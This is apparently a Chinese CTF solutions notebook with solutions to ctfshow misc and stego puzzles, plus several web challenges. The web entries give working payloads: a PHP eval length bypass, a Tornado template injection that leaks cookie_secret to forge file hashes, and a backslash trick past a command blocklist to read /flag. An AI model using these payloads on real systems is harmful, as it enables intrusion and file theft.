ffff,0xf80017ff80ffffffbff7ffefffffffff,0xffffd7ffffffffff0037ffefffffffff,0xffffc7ffffffffffffc3ffefffffffff,0xffffefffffffffffffffffefffffffff,0xffffefffffffffffffffffcfffffffff,0xffffffffffffffffffffffffffffffff,0xffffffffffffffffffffffffffffffff,0xffffffffffffffffffffffffffffffff,0xffffffffffffffffffffffffffffffff,0xffffffffffffffffffffffffffffffff,0xffffffffffffffffffffffffffffffff,0xffffffffffffffffffffffffffffffff,0xffffe03fffffffffffffffffffffffff,0xffffcf9fffffffffffffffffffffffff,0xffff9fdffffffffffffffff7ffffffff,0xffffbfdffffffffffffffff7ffffffff,0xffffbfcffffffffffffffff7ffffffff,0xffff3feffffffffffffffff7ffffffff,0xffff7feffffffffffffffff7ffffffff,0xffff7feffffffffffffffff7ffffffff,0xffff000000007ffffffffff7ffffffff,0xffffbffffffe7ffffffffff7ffffffff,0xfffffffffffffffffffffff7ffffffff,0xfffffffffffffffffffffff7ffffffff,0xfffffffffffffffffffffff7ffffffff,0xfffffffffffffffffffffff7ffffffff,0xffffffdffffffffffffffff7ffffffff,0xffffffcffffffffffffffff7ffffffff,0xffff07effffffffffffffff7ffffffff,0xffff73effffffffffffffff7ffffffff,0xffff7beffffffffffffffff7ffffffff,0xffff7beffffffffffffffff7ffffffff,0xffff7beffffffffffffffff7ffffffff,0xffff9bcffffffffffffffff7ffffffff,0xffffc3dffffffffffffffff7ffffffff,0xfffff01ffffffffffffffff7ffffffff,0xfffffffffffffffffffffff7ffffffff,0xfcfffffffffffffffffffff7ffffffff,0xfe1ffffffffffffffffffff7ffffffff,0xffe0fffffffffffffffffff7ffffffff,0xfffe07fffffffffffffffff7ffffffff,0xfffff00ffffffffffffffff7ffffffff,0xffffffeffffffffffffffff7ffffffff,0xffffff8ffffffffffffffff7ffffffff,0xfffffe3ffffffffffffffff7ffffffff,0xfffff8ffffffffffffffffffffffffff,0xffffe3ffffffffffffffffffffffffff,0xfffe1fffffffffffffffffffffffffff,0xffc0ffffffffffffffffffffffffffff,0xfc1fffffffffffffffffffffffffffff,0xfc7fffffffffffffffffffffffffffff,0xff807fffffffffffffffffffffffffff,0xffff01ffffffffffffffffffffffffff,0xfffffc07ffffffffffffffffffffffff,0xffffffffffffffffffffffffffffffff,0xffffffffffffffffffffffffffffffff,0xffffffffffffffffffffffffffffffff,0xffffffffffffffffffffffffffffffff,0xffffffffffffffffffffffffffffffff,0xffffffffffffffffffffffffffffffff,0xffffffffffffffffffffffffffffffff]
reasult = ''
for i in flag:
line = hex(i)
print(bin(int(line,16)).replace('0b',''))
```
# 2021/ 3/21
## ctfshow  misc2

![图片](https://uploader.shimo.im/f/jyE9aRtmlnbAPpoo.png!thumbnail?fileGuid=H6gChgR9HdcCqkRq)

1.44MB软盘使用的FAT文件系统通常为FAT12，根据[FAT12的MBR引导记录结构](https://zhuanlan.zhihu.com/p/121807427?fileGuid=H6gChgR9HdcCqkRq)，第54字节开始的8位应固定为FAT12。而该文件中被修改成了FAT11，需要进行修复。

![图片](https://uploader.shimo.im/f/Rvy4eAKUTUhxFDIU.png!thumbnail?fileGuid=H6gChgR9HdcCqkRq)

然后vmvare挂载该镜像

![图片](https://uploader.shimo.im/f/UlGAsD27MoU8tEdu.png!thumbnail?fileGuid=H6gChgR9HdcCqkRq)

![图片](https://uploader.shimo.im/f/OWSBmultqZtHXsQe.png!thumbnail?fileGuid=H6gChgR9HdcCqkRq)

这边配置虚拟机的时候要选MS-Dos

运行虚拟机即可

![图片](https://uploader.shimo.im/f/ANQ7xqcP5Fi8105l.png!thumbnail?fileGuid=H6gChgR9HdcCqkRq)

## misc50

![图片](https://uploader.shimo.im/f/gHuWRFgot9CNG9bo.png!thumbnail?fileGuid=H6gChgR9HdcCqkRq)

010查看图片存在一个base64的字符串和一个压缩包

```plain
Sk5DVlM2Mk1NRjVIU1gyTk1GWEgyQ1E9Cg==
```
分离压缩包得到一个txt文档
```plain
f = open('D://CTF//aaa//_welcome.png.extracted//thienc.txt').read()
reasult = ''
for i in range(0,len(f),2):
n = int(f[i:i+2],16)
reasult += chr(n)
# print(reasult)
reasult = reasult.split('0x')[1:]
# print(reasult)
f2 = b''
for i in reasult:
f2 += bytes.fromhex(i.zfill(2))
f3 = open('D://CTF//aaa//_welcome.png.extracted//1.7z','wb')
f3.write(f2)
```
解密base64和32的混合版
```plain
import base64
import re
f = open('D://CTF//aaa//_welcome.png.extracted//secenc.txt').read()
while True:
if re.match('^[2-7A-Z=]+$', f.decode('utf-8')):
f = base64.b32decode(f)
elif re.match('^[0-9a-zA-Z+/=]+$', f.decode('utf-8')):
f = base64.b64decode(f)
else:
print(f.decode('utf-8'))
break
```
## misc30

下载是一个rar压缩包,没有密码的星空图片，在详细信息里得到docx的密码

![图片](https://uploader.shimo.im/f/lfXMPAvhptDQM0PB.png!thumbnail?fileGuid=H6gChgR9HdcCqkRq)

把颜色调整为黑色，得到png的密码

![图片](https://uploader.shimo.im/f/GTdAyGrvPPkHRWgn.png!thumbnail?fileGuid=H6gChgR9HdcCqkRq)

扫码得到flag

## stega1

无密码的JPHS隐写

解密得到flag

## misc3

```plain
密文：zse4rfvsdf 6yjmko0
提示1：解密后两个字符,小写 提示2：看看自己下面
提交flag{明文}
```
很显然是键盘密码。根据字符在键盘上对应按键的排列形状得到A和V。
## misc40

![图片](https://uploader.shimo.im/f/g5cR4Qj4eugtlY1g.png!thumbnail?fileGuid=H6gChgR9HdcCqkRq)

二维码图片010打开发现brainfuck，解码得到核心价值观，再解码得到123456

使用MP3Stego对mp3进行解密,得到wav的密码

```plain
Decode.exe -X -P 123456 svega.mp3
```
![图片](https://uploader.shimo.im/f/TybX7gC2XiaiazoO.png!thumbnail?fileGuid=H6gChgR9HdcCqkRq)

使用SilentEye对wav进行解密,使用convert.txt得到的密码202013。

![图片](https://uploader.shimo.im/f/ANU9C23l5nkSaKqU.png!thumbnail?fileGuid=H6gChgR9HdcCqkRq)

```plain
flag{C0ngr4tul4ti0n!}
```

## [GUET-CTF2019]zips

考察爆破-伪加密-掩码攻击

```plain
zip -e --password=`python -c "print(__import__('time').time())"` flag.zip flag
```
![图片](https://uploader.shimo.im/f/zzMsYWZpBv558QUT.png!thumbnail?fileGuid=H6gChgR9HdcCqkRq)

![图片](https://uploader.shimo.im/f/R0gClK1m15FtfiZz.png!thumbnail?fileGuid=H6gChgR9HdcCqkRq)

# 2021/3/22
## misc30

下载后是一个加密的压缩包,先判断是否是伪加密直接 binwalk分离得到mp3文件

```plain
foremost .mp3得到封面图片
```
发现图片的高度被修改了
jpg图片修改

![图片](https://uploader.shimo.im/f/HqGnOZa5PheGajWb.png!thumbnail?fileGuid=H6gChgR9HdcCqkRq)

![图片](https://uploader.shimo.im/f/hV7P1uwbcfvYdLNB.png!thumbnail?fileGuid=H6gChgR9HdcCqkRq)

得到猪圈密码，解密拿到flag

## 红包第一弹

下载之后很多压缩包，且每个压缩包李有一张图片，每张图片后面都有隐藏的数据，经过判断后为base64,使用base64提取图片多余数据

```plain
import zipfile
import base64
path1 = 'D:/Desktop/flag/'
path2 = 'D:/Desktop/flag/out/'
res = ''
for i in range(1, 87):
    zip = zipfile.ZipFile(path1 + str(i) + '.zip')
    jpg = str(i) + '.jpg'
    zip.extract(jpg, path2)
    zip.close()
    f = open(path2 + jpg, 'rb').read()
    res += f[len(f)-100:len(f)+1].decode('utf-8')
a = base64.b64decode(res)
# print(a)
print(res)
```
![图片](https://uploader.shimo.im/f/DD3VbppquCsWHNx6.png!thumbnail?fileGuid=H6gChgR9HdcCqkRq)

提取后使用data:image/png;base64  +base编码访问拿到二维码，扫码得到flag(八神tql)

```plain
data:image/png;base64,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
```
## 红包题第三弹

无题，李商隐

## stega10

下载得到jpg图片

```plain
strings 图片查看发现
aHR0cHM6Ly93d3cubGFuem91cy5jb20vaTliMGtzZA
```
base64解码
```plain
加两个等号解码
#https://www.lanzous.com/i9b0ksd
```
访问url下载一个压缩包
![图片](https://uploader.shimo.im/f/9DYzNvgkdWpQNOHM.png!thumbnail?fileGuid=H6gChgR9HdcCqkRq)

密码是crc32爆破

```plain
CRC32脚本
import zipfile
import string
import binascii
crc = []
zip = zipfile.ZipFile('D:/Desktop/Adobe Photoshop CC 2019/flag.zip', 'r')
for i in zip.namelist():
    crc += [zip.getinfo(i).CRC]
crc = crc[1:10]
for i in range(9):
    for j in string.printable:
        c = binascii.crc32(j.encode('utf-8'))
        if c == crc[i]:
            print(j, end = '')
```
得到秘钥
```plain
447^*5#)7
```
解压缩包得到一张图片不过里面是逆序的png图片
使用脚本倒置

```plain
a = open('D:/Desktop/Adobe Photoshop CC 2019/n.png','rb').read()
b = open('D:/Desktop/Adobe Photoshop CC 2019/1.png','wb')
b.write(a[::-1])
```
扫码得到flag
## stega11

![图片](https://uploader.shimo.im/f/PjNIweDhBeBZxG3i.png!thumbnail?fileGuid=H6gChgR9HdcCqkRq)

```plain
MZWGCZ33GZTDCNZZG5SDIMBYGBRDEOLCGY2GIYJVHA4TONZYGA2DMM3FGMYH2
```
## misc4

下载是压缩包里面是docx文件，打开看到pk直接改后缀，

![图片](https://uploader.shimo.im/f/X4WrKxrGKS6zSYF2.png!thumbnail?fileGuid=H6gChgR9HdcCqkRq)

![图片](https://uploader.shimo.im/f/5v3J2HFt38sigEnh.png!thumbnail?fileGuid=H6gChgR9HdcCqkRq)

## 红包第四弹

[https://blog.csdn.net/qq_42016346/article/details/104910937](https://blog.csdn.net/qq_42016346/article/details/104910937?fileGuid=H6gChgR9HdcCqkRq)

# 2021/3/23
![图片](https://uploader.shimo.im/f/6YBtpL1vYgj6rUCA.png!thumbnail?fileGuid=H6gChgR9HdcCqkRq)


![图片](https://uploader.shimo.im/f/6WDa1CiXq5khX4yn.png!thumbnail?fileGuid=H6gChgR9HdcCqkRq)

# 


## Nepctf web

```plain
<?php
error_reporting(0);
highlight_file(__FILE__);
$nep = $_GET['nep'];
$len = $_GET['len'];
if(intval($len)<8 && strlen($nep)<13){
eval(substr($nep,0,$len));
}else{
die('too long!');
}
?>
```
```plain
?nep=`*>1`;&len=7
```
# 2021/4/10
## [护网杯 2018]easy_tornado

![图片](https://uploader.shimo.im/f/y0O54v7PqUxaRAr9.png!thumbnail?fileGuid=H6gChgR9HdcCqkRq)

存在一个Hint.txt

![图片](https://uploader.shimo.im/f/dPdz1X3gXdslPhs1.png!thumbnail?fileGuid=H6gChgR9HdcCqkRq)

也就是说要想获得flag得知道cookie_sectet和filename,在flag.txt里给了filename,那么我们只需要知道cookie_secret即可，因为是模板注入，所以我们要寻找注入点。

![图片](https://uploader.shimo.im/f/ZbxeJG6ilAGthSBN.png!thumbnail?fileGuid=H6gChgR9HdcCqkRq)

在error这里找到注入点。那么我们就可以获取cookie_secret了。

```plain
error?msg={{handler.settings}}
```
{'autoreload': True, 'compiled_template_cache': False, 'cookie_secret': 'c3103141-087a-4774-baae-121d0b3404f4'}
然后我们按照hint的要求构造payload即可。

```plain
file?filename=/fllllllllllllag&filehash=15d108a875afafaa2df3c257a74023d8
```
md5脚本

```plain
import hashlib
hash = hashlib.md5()
filename='/fllllllllllllag'
cookie_secret="c3103141-087a-4774-baae-121d0b3404f4"
hash.update(filename.encode('utf-8'))
s1=hash.hexdigest()
hash = hashlib.md5()
hash.update((cookie_secret+s1).encode('utf-8'))
print(hash.hexdigest())
```
## [安洵杯 2019]easy_web

打开题目,url里有一串不对劲的编码

```plain
index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&cmd=
```
按照base64-base64-hex进行解码得到
```plain
555.png
```
也就是说此处进行了文件包含，包含了555.png，那么我们可以尝试读一下index.php,按照加密方式加密回去
```php
<?php
error_reporting(E_ALL || ~ E_NOTICE);
header('content-type:text/html;charset=utf-8');
$cmd = $_GET['cmd'];
if (!isset($_GET['img']) || !isset($_GET['cmd']))
header('Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&cmd=');
$file = hex2bin(base64_decode(base64_decode($_GET['img'])));
$file = preg_replace("/[^a-zA-Z0-9.]+/", "", $file);
if (preg_match("/flag/i", $file)) {
echo '';
die("xixi～ no flag");
} else {
$txt = base64_encode(file_get_contents($file));
echo "";
echo "
";
}
echo $cmd;
echo "
";
if (preg_match("/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\'|\"|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\{|\}|\(|\)|\&[^\d]|@|\||\\$|\[|\]|{|}|\(|\)|-|<|>/i", $cmd)) {
echo("forbid ~");
echo "
";
} else {
if ((string)$_POST['a'] !== (string)$_POST['b'] && md5($_POST['a']) === md5($_POST['b'])) {
echo `$cmd`;
} else {
echo ("md5 is funny ~");
}
}
?>
```
关键代码位于下面，pass掉md5强类型以后，执行echo `cmd`但是对cmd进行了过滤，其中|\\\|相当于没有对\进行过滤,所以payload为
```plain
get:cmd=ca\t /flag
